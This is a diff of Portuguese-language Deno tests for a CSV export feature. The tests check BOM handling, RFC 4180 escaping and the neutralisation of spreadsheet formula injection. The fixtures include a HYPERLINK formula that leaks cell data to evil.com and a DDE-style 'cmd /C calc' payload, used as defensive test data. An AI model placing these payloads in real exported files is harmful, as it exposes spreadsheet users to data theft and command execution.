@@ -19,6 +19,9 @@ import {
   gerarCsv,
   gerarPdf,
   sanitizarTextoWinAnsi,
+  neutralizarFormulaCsv,
+  escaparCelulaCsv,
+  BOM_UTF8,
   formatarCentavosReais,
   formatarHoraLocal,
   formatarDataLocal,
@@ -356,7 +359,8 @@ Deno.test("exportação CSV devolve 200 com Content-Type text/csv e campos da RN
   assertEquals(res.headers.get("Cache-Control"), "no-store");
 
   const texto = await res.text();
-  const linhas = texto.split("\r\n");
+  assert(texto.startsWith("\uFEFF"), "CSV deve iniciar com BOM UTF-8 (\uFEFF) para compatibilidade com Excel");
+  const linhas = texto.replace(/^\uFEFF/, "").split("\r\n");
 
   // Cabeçalho
   assertEquals(
@@ -560,7 +564,8 @@ Deno.test("RN17 / RN15 / LGPD: CSV e PDF gerados contêm estritamente as colunas
   assertEquals(resCsv.status, 200);
   assertEquals(resCsv.headers.get("Cache-Control"), "no-store");
   const csvTexto = await resCsv.text();
-  const linhas = csvTexto.split("\r\n");
+  assert(csvTexto.startsWith("\uFEFF"), "CSV deve iniciar com BOM UTF-8 (\uFEFF) para compatibilidade com Excel");
+  const linhas = csvTexto.replace(/^\uFEFF/, "").split("\r\n");
 
   // 1. Cabeçalho deve bater 100% com as 9 colunas da RN17
   const cabecalhoEsperado = "Data,Funcao,Inicio Previsto,Fim Previsto,Checkin,Checkout,Valor Acordado,Contraparte,Status";
@@ -862,6 +867,111 @@ Deno.test("porta: validacao estrita do formato Authorization Bearer rejeita malf
   assertEquals(resPositivo.status, 200, "bearer em minúsculo deve ser aceito na porta pela flag /i");
   assertEquals(ePositivo.chamadasAuth.length, 1);
 });
+
+// ── Segurança: Neutralização de Fórmulas CSV (OWASP CSV Injection / CWE-1236) ──
+
+Deno.test("seguranca csv: gerarCsv neutraliza formulas (=, +, -, @, TAB, \\r) em colunas de texto livre com prefixo ' e aspas em \\r", () => {
+  const turnosInjecao: TurnoExportacao[] = [
+    {
+      turno_id: "f3000000-0000-4000-8000-000000000001",
+      data: "2026-09-22",
+      funcao: '=HYPERLINK("http://evil.com?leak="&A1; "Clique aqui")',
+      inicio_em: "2026-09-22T18:00:00Z",
+      fim_em: "2026-09-23T02:00:00Z",
+      checkin_em: null,
+      checkout_em: null,
+      valor_acordado_centavos: 15000,
+      contraparte: "@SUM(1+1)*cmd|' /C calc'!A0",
+      verificacao: "verificado",
+    },
+    {
+      turno_id: "f3000000-0000-4000-8000-000000000002",
+      data: "2026-09-23",
+      funcao: "+1+1",
+      inicio_em: "2026-09-23T18:00:00Z",
+      fim_em: "2026-09-24T02:00:00Z",
+      checkin_em: null,
+      checkout_em: null,
+      valor_acordado_centavos: 15000,
+      contraparte: "-1+1",
+      verificacao: "pendente",
+    },
+    {
+      turno_id: "f3000000-0000-4000-8000-000000000003",
+      data: "2026-09-24",
+      funcao: "\tDDE_EXEC",
+      inicio_em: "2026-09-24T18:00:00Z",
+      fim_em: "2026-09-25T02:00:00Z",
+      checkin_em: null,
+      checkout_em: null,
+      valor_acordado_centavos: 15000,
+      contraparte: "\rCR_INJECTION",
+      verificacao: "nao_verificado",
+    },
+  ];
+
+  const csv = gerarCsv(turnosInjecao);
+
+  // Prova que = foi neutralizado com ' e escapado com aspas duplas internas
+  assertStringIncludes(csv, `"'=HYPERLINK(""http://evil.com?leak=""&A1; ""Clique aqui"")"`);
+
+  // Prova que @ foi neutralizado com '
+  assertStringIncludes(csv, `'@SUM(1+1)*cmd|' /C calc'!A0`);
+
+  // Prova que + foi neutralizado com '
+  assertStringIncludes(csv, `'+1+1`);
+
+  // Prova que - foi neutralizado com '
+  assertStringIncludes(csv, `'-1+1`);
+
+  // Prova que TAB (\t) foi neutralizado com '
+  assertStringIncludes(csv, `'\tDDE_EXEC`);
+
+  // Prova que \r foi neutralizado com ' e envolvido por aspas duplas (RFC 4180)
+  assertStringIncludes(csv, `"'\rCR_INJECTION"`);
+});
+
+Deno.test("seguranca csv: escaparCelulaCsv envolve células com \\r em aspas duplas e preserva RFC 4180", () => {
+  assertEquals(escaparCelulaCsv("linha1\rlinha2"), '"linha1\rlinha2"');
+  assertEquals(escaparCelulaCsv("linha1\nlinha2"), '"linha1\nlinha2"');
+  assertEquals(escaparCelulaCsv('texto com "aspas"'), '"texto com ""aspas"""');
+  assertEquals(escaparCelulaCsv("texto,com,virgula"), '"texto,com,virgula"');
+  assertEquals(escaparCelulaCsv("texto normal"), "texto normal");
+});
+
+Deno.test("seguranca csv: textos legítimos (hífen no meio, etc.) NÃO são alterados de forma que quebre", () => {
+  const turnosLegitimos: TurnoExportacao[] = [
+    {
+      turno_id: "f3000000-0000-4000-8000-000000000004",
+      data: "2026-09-22",
+      funcao: "Auxiliar de Cozinha",
+      inicio_em: "2026-09-22T18:00:00Z",
+      fim_em: "2026-09-23T02:00:00Z",
+      checkin_em: null,
+      checkout_em: null,
+      valor_acordado_centavos: 15000,
+      contraparte: "Maria-José Bar e Restaurante",
+      verificacao: "verificado",
+    },
+  ];
+
+  const csv = gerarCsv(turnosLegitimos);
+
+  // Nome legítimo com hífen no meio NÃO recebe apóstrofo
+  assertStringIncludes(csv, "Maria-José Bar e Restaurante");
+  assert(!csv.includes("'Maria-José"), "Hífen no meio não deve disparar prefixação de apóstrofo");
+
+  // Coluna de checkin ausente formatada com "-" NÃO deve virar "'-'"
+  assertStringIncludes(csv, ",-,");
+  assert(!csv.includes("'-'"), "Marcador '-' do sistema não deve ser alterado");
+});
+
+Deno.test("seguranca csv: CSV inicia com BOM UTF-8 (\\uFEFF) para compatibilidade com acentos no Excel", () => {
+  const csv = gerarCsv(TURNOS_MOCK);
+  assert(csv.startsWith("\uFEFF"), "CSV deve iniciar com BOM UTF-8 (\\uFEFF)");
+});
+
+
 
 
 
